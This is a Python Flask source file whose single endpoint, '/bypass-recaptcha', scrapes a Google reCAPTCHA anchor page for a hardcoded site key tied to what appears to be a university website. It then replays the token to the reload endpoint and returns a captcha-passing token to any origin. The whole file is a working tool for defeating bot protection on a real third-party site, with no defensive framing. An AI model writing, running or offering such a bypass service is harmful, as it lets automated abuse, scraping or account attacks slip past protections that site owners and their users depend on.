from flask import Flask, request, jsonify
from flask_cors import CORS
import requests

app = Flask(__name__)
CORS(app, resources={r"/*": {"origins": "*"}})

@app.route('/bypass-recaptcha', methods=['GET'])
def bypass_recaptcha():
    anchorr = "https://www.google.com/recaptcha/api2/anchor?ar=1&k=6Ldb0ioqAAAAAJMH5vs0_SAPK72nf7hEE5R9wpmf&co=aHR0cHM6Ly9rdHUuZWR1LmluOjQ0Mw..&hl=en-GB&v=i7X0JrnYWy9Y_5EYdoFM79kV&size=invisible&cb=pgvngu12j9ny".strip()

    if not anchorr:
        return jsonify({'error': 'Anchor URL is required'}), 400

    try:
        keysite = anchorr.split('k=')[1].split("&")[0]
        var_co = anchorr.split("co=")[1].split("&")[0]
        var_v = anchorr.split("v=")[1].split("&")[0]

        r1 = requests.get(anchorr).text

        token1 = r1.split('recaptcha-token" value="')[1].split('">')[0]

        print("\n\nBypassing Recaptcha...")

        payload = {
            "v": var_v,
            "reason": "q",
            "c": token1,
            "k": keysite,
            "co": var_co,
            "hl": "en",
            "size": "invisible"
        }

        r2 = requests.post(f"https://www.google.com/recaptcha/api2/reload?k={keysite}", data=payload)
        try:
            token2 = str(r2.text.split('"rresp","')[1].split('"')[0])
        except:
            token2 = 'null'

        if token2 == "null":
            return jsonify({'status': 'Recaptcha not vulnerable', 'details': r2.text}), 200
        else:
            result = {
                'status': 'Recaptcha Bypassed',
                'token': token2,
            }
            return jsonify(result), 200

    except Exception as e:
        return jsonify({'error': str(e)}), 500
